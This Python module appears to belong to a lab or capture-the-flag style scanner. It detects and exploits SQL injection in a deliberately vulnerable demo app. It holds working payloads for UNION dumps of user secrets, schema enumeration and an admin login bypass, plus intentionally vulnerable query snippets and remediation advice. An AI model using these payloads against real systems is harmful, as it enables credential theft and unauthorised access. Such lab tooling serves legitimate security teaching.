"""SQL Injection (SQLi) -- detect, exploit, and remediate.

WHAT IT IS
----------
SQL injection happens when untrusted input is concatenated straight into a SQL
statement instead of being passed as a bound parameter. The attacker's text then
stops being *data* and becomes *code*: it can change the WHERE clause, append a
UNION to dump arbitrary tables, or comment out the rest of the query to bypass an
authentication check. The demo app's ``/search`` and ``/login`` handlers do
exactly this::

    # /search  -- the prize surface
    sql = "SELECT id, username, email FROM users WHERE username LIKE '%" + q + "%'"
    # /login   -- the auth-bypass surface
    sql = "SELECT id, username, role FROM users WHERE username='" + u + \\
          "' AND password='" + p + "'"

HOW WE DISCOVER IT
------------------
Three independent signals, weakest assumption last:

1. **Error-based.** Sending a single quote ``'`` unbalances the string literal.
   A safe app would treat it as data; this one leaks ``SQL error: unrecognized
   token`` straight into the page -- a smoking gun that input reaches the parser.
2. **Boolean-based (blind).** Even with errors suppressed, we append a *true*
   tail (``admin' AND '1'='1' -- ``) and a *false* tail
   (``admin' AND '1'='2' -- ``) after a prefix we know matches one row. The true
   case returns that row; the false case returns none. A differing result set
   from a logically-equivalent-looking query proves the WHERE clause is ours.
   (The trailing ``-- `` comments out the app's own ``%'`` so our clause ends the
   statement.)
3. **UNION-based.** ``/search`` returns three columns, so a balanced
   ``UNION SELECT`` of three expressions stitches attacker-chosen rows into the
   results -- confirmed when injected sentinel data appears in the output.

HOW WE EXPLOIT IT
-----------------
* **UNION dump.** ``' UNION SELECT id, secret, role FROM users -- `` maps the
  secret column onto the visible ``username`` column, dumping every user's
  ``secret`` -- including ``admin.secret``, which is the planted flag.
* **Schema enumeration.** Pivoting the same UNION through ``sqlite_master`` lists
  the database's tables, the reconnaissance step that finds ``users`` in the
  first place.
* **Auth bypass.** Logging in as ``admin' -- `` with any password comments out
  the password check entirely: ``WHERE username='admin' -- ' AND password='x'``
  matches the admin row and the app hands back an admin session cookie.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never build SQL by string concatenation --
use parameterised queries / prepared statements so input can never change the
query's structure.
"""
from __future__ import annotations

import html
import os
import re
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never assemble SQL by concatenating or interpolating untrusted input. Use "
    "parameterised queries (a.k.a. prepared statements / bound parameters) so the "
    "driver sends the query structure and the data separately and the input can "
    "never alter the statement -- e.g. "
    "cursor.execute(\"SELECT id, username, email FROM users WHERE username LIKE ?\", "
    "('%' + q + '%',)) instead of f-string concatenation. Layer defence in depth: "
    "validate/allow-list inputs, apply least-privilege database accounts (no DDL or "
    "access to unrelated tables), use an ORM or query builder that parameterises by "
    "default, and disable verbose database errors in production so the parser never "
    "leaks schema details to an attacker (error-based SQLi). For the auth path, "
    "verify credentials with a parameterised lookup and a constant-time password "
    "hash comparison, never by embedding the username/password in the SQL text."
)

#: The search/login sink, used as the Finding endpoint.
ENDPOINT: str = "/search?q="

# --- the working exploit payloads (the ones the assess() flow relies on) -----
#: UNION dump that lands ``users.secret`` in the visible username column.
UNION_DUMP_PAYLOAD: str = "' UNION SELECT id, secret, role FROM users -- "
#: UNION pivot through sqlite_master to enumerate table names.
UNION_SCHEMA_PAYLOAD: str = (
    "' UNION SELECT name, sql, type FROM sqlite_master WHERE type='table' -- "
)
#: /login auth-bypass: comment out the password check, log in as admin.
LOGIN_BYPASS_USER: str = "admin' -- "

# --- blind boolean differentiators (known-matching prefix + true/false tail) -
_BOOL_TRUE_PAYLOAD: str = "admin' AND '1'='1' -- "
_BOOL_FALSE_PAYLOAD: str = "admin' AND '1'='2' -- "

# Markers the app emits.
_ERROR_MARKER: str = "SQL error"
_ROW_RE = re.compile(r"class='user'")


def _load_payloads() -> List[str]:
    """Load the detection payloads from the data file (one per line)."""
    path = os.path.join(os.path.dirname(__file__), "data", "sqli_payloads.txt")
    payloads: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if not line.strip() or line.lstrip().startswith("#"):
                    continue
                payloads.append(line)
    except OSError:
        # Fall back to the in-code essentials so the engine still works if the
        # data file is missing.
        payloads = ["'", "' OR 1=1 -- ", "' OR 1=2 -- "]
    return payloads


#: Detection payloads (loaded once at import); exploit payloads appended so the
#: public PAYLOADS list reflects everything the engine sends.
PAYLOADS: List[str] = _load_payloads() + [
    UNION_DUMP_PAYLOAD,
    UNION_SCHEMA_PAYLOAD,
    LOGIN_BYPASS_USER,
]


# --- low-level probes --------------------------------------------------------
def _search(client: WebClient, q: str) -> Response:
    return client.get("/search", params={"q": q})


def _row_count(resp: Response) -> int:
    """How many user rows the search page rendered."""
    return len(_ROW_RE.findall(resp.text))


# --- detection ---------------------------------------------------------------
def detect_error_based(client: WebClient) -> Tuple[bool, str]:
    """Probe with a lone quote; True if the app leaks a SQL parser error."""
    resp = _search(client, "'")
    if _ERROR_MARKER in resp.text:
        snippet = resp.text.strip()
        return True, snippet[:160]
    return False, ""


def detect_boolean_based(client: WebClient) -> Tuple[bool, str]:
    """True if a tautology vs. contradiction tail changes the result set.

    Uses a prefix (``admin``) known to match exactly one row, so the *true* tail
    yields that row and the *false* tail yields none -- proof the WHERE clause is
    attacker-controlled even without any error message (blind SQLi).
    """
    true_resp = _search(client, _BOOL_TRUE_PAYLOAD)
    false_resp = _search(client, _BOOL_FALSE_PAYLOAD)
    true_n = _row_count(true_resp)
    false_n = _row_count(false_resp)
    if true_n > false_n:
        return True, (
            f"true-tail returned {true_n} row(s), false-tail returned "
            f"{false_n} -- result set is attacker-controlled"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def _parse_search_rows(resp: Response) -> List[Tuple[str, str, str]]:
    """Extract the three pipe-separated columns from each rendered user div."""
    rows: List[Tuple[str, str, str]] = []
    # re.S so the (.*?) also matches rows whose middle column (e.g. a multi-line
    # CREATE TABLE statement from sqlite_master) spans newlines.
    for raw in re.findall(r"<div class='user'>(.*?)</div>", resp.text, re.S):
        # The middle column can itself contain '|' (and commas/newlines), so
        # split only into the first and last column and treat the rest as col1.
        first, _, rest = raw.partition("|")
        middle, _, last = rest.rpartition("|")
        parts = [html.unescape(first.strip()), html.unescape(middle.strip()),
                 html.unescape(last.strip())]
        if rest:  # at least two '|' separators were present
            rows.append((parts[0], parts[1], parts[2]))
    return rows


def exploit_union_dump(client: WebClient) -> List[Dict[str, str]]:
    """UNION-dump the users table; secret lands in the visible username column.

    Returns a list of ``{"id", "secret", "role"}`` dicts -- the injected rows
    carry each user's secret (admin's secret is the flag). The app interleaves
    its own legitimate ``id | username | email`` rows; we keep only the rows
    whose middle column looks like a recovered secret/flag.
    """
    resp = _search(client, UNION_DUMP_PAYLOAD)
    dumped: List[Dict[str, str]] = []
    for col0, col1, col2 in _parse_search_rows(resp):
        # The injected UNION rows put role ("admin"/"user") in the third column,
        # whereas the app's own rows put an email there. Use that to keep ours.
        if col2 in ("admin", "user"):
            dumped.append({"id": col0, "secret": col1, "role": col2})
    return dumped


def exploit_enumerate_tables(client: WebClient) -> List[str]:
    """UNION through sqlite_master to list the database's table names."""
    resp = _search(client, UNION_SCHEMA_PAYLOAD)
    tables: List[str] = []
    for col0, _col1, col2 in _parse_search_rows(resp):
        if col2 == "table" and col0 not in tables:
            tables.append(col0)
    return tables


def exploit_login_bypass(client: WebClient) -> Tuple[bool, str]:
    """Bypass /login auth by commenting out the password check.

    Returns ``(ok, evidence)``. On success the app welcomes us as admin and sets
    an admin session cookie.
    """
    resp = client.post(
        "/login", data={"username": LOGIN_BYPASS_USER, "password": "anything"}
    )
    ok = resp.status == 200 and "Welcome admin" in resp.text
    set_cookie = resp.header("Set-Cookie") or ""
    evidence = f"{resp.text.strip()} | Set-Cookie: {set_cookie}" if ok else ""
    return ok, evidence


def _find_admin_secret(rows: List[Dict[str, str]]) -> Optional[str]:
    """Pull the admin secret (the flag) out of the dumped rows."""
    for row in rows:
        if row.get("role") == "admin":
            return row.get("secret")
    # Fall back: any dumped value that is the known flag.
    for row in rows:
        if C.FLAGS["sqli"] in str(row.get("secret", "")):
            return row.get("secret")
    return None


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect SQLi, then exploit it (UNION dump + schema enum + auth bypass).

    Returns a :class:`Finding` whose ``exploit_result`` contains the dumped
    ``admin.secret`` (== ``C.FLAGS["sqli"]``).
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    err_found, err_evidence = detect_error_based(client)
    if err_found:
        techniques.append("error")
    bool_found, bool_evidence = detect_boolean_based(client)
    if bool_found:
        techniques.append("boolean")

    # 2) Exploitation -------------------------------------------------------
    dumped_rows = exploit_union_dump(client)
    if dumped_rows:
        techniques.append("union")
    tables = exploit_enumerate_tables(client)
    login_ok, login_evidence = exploit_login_bypass(client)

    admin_secret = _find_admin_secret(dumped_rows)
    discovered = bool(err_found or bool_found or dumped_rows)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if err_found:
        evidence_parts.append(f"error-based: {err_evidence}")
    if bool_found:
        evidence_parts.append(f"boolean-based: {bool_evidence}")
    if dumped_rows:
        evidence_parts.append(
            f"union-based: dumped {len(dumped_rows)} user secret(s) "
            f"from the users table"
        )
    if login_ok:
        evidence_parts.append(f"auth-bypass: {login_evidence}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "admin_secret": admin_secret,
        "flag": admin_secret,
        "dumped_rows": dumped_rows,
        "tables": tables,
        "login_bypass": login_evidence if login_ok else None,
        "techniques": techniques,
    }

    return Finding(
        vuln="SQL Injection",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=UNION_DUMP_PAYLOAD,
        extra={
            "dumped_rows": dumped_rows,
            "tables": tables,
            "techniques": techniques,
            "login_bypass_payload": LOGIN_BYPASS_USER,
            "login_bypass_ok": login_ok,
            "error_based": err_found,
            "boolean_based": bool_found,
            "union_based": bool(dumped_rows),
        },
    )
